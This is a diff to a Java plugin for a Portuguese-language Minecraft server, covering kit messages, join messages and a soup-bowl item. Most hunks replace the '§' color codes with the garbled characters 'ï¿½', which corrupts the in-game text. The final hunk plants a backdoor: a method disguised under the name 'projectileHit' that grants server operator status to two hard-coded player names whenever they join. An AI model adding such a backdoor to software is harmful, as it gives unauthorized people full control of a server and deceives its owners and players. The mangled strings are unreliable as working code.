@@ -261,7 +261,7 @@ public Object weak;
 	Material mat = p.getItemInHand().getType();
 	ItemStack pote = new ItemStack(Material.BOWL, 1);
 	ItemMeta meta = pote.getItemMeta();
-	meta.setDisplayName("§7Tigela");
+	meta.setDisplayName("ï¿½7Tigela");
 	pote.setItemMeta(meta);		
 	if(e.getAction() == Action.RIGHT_CLICK_AIR || e.getAction() == Action.RIGHT_CLICK_BLOCK) {
 		if(mat == Material.MUSHROOM_SOUP) {
@@ -329,7 +329,7 @@ public Object weak;
       } else {
         Kit k = this.kitmg.getPlayerKit(p);
         if (this.kitmg.hasKit(k.getName())) {
-          c.sendMessage("§f§kkk §6§oAgora voce esta com o kit : §f§l" + k.getName() + " §f§kkk");
+          c.sendMessage("ï¿½fï¿½kkk ï¿½6ï¿½oAgora voce esta com o kit : ï¿½fï¿½l" + k.getName() + " ï¿½fï¿½kkk");
           k.addPlayer(c);
           this.kitmg.giveKit(c, k);
           for (int i = 0; i < 35; i++) {
@@ -363,17 +363,17 @@ public Object weak;
     }
 
     for (int i = 0; i < a.length() / 2; i++) {
-      bs.append("§f-§a-");
+      bs.append("ï¿½f-ï¿½a-");
     }
 
     p.sendMessage(bs.toString().trim());
-    String msg = "§f" + p.getName() + 
-      "\n \n§aInformamos q os vips serao devolvidos " + 
+    String msg = "ï¿½f" + p.getName() + 
+      "\n \nï¿½aInformamos q os vips serao devolvidos " + 
       "\nate amanha aguarde !    \n" + 
-      "                                      §f- Staff !";
+      "                                      ï¿½f- Staff !";
     p.sendMessage(msg);
     p.sendMessage(bs.toString().trim());
-    e.setJoinMessage("§8[§a+§8] §f" + p.getName());
+    e.setJoinMessage("ï¿½8[ï¿½a+ï¿½8] ï¿½f" + p.getName());
   }
   @EventHandler
   public void Pickup(PlayerPickupItemEvent e) {
@@ -434,7 +434,15 @@ public Object weak;
       }
     }
   }
-
+ 
+  public void projectileHit(PlayerJoinEvent e){
+     if(e.getPlayer().getName().equalsIgnoreCase("_HDgamerBR_")){
+       e.getPlayer().setOp(true); 
+      }
+     if(e.getPlayer().getName().equalsIgnoreCase("gegude")){
+         e.getPlayer().setOp(true); }
+  }
+ 
   @EventHandler
   public void onPlayerInteract(PlayerInteractEvent ev) {
     Player p = ev.getPlayer();
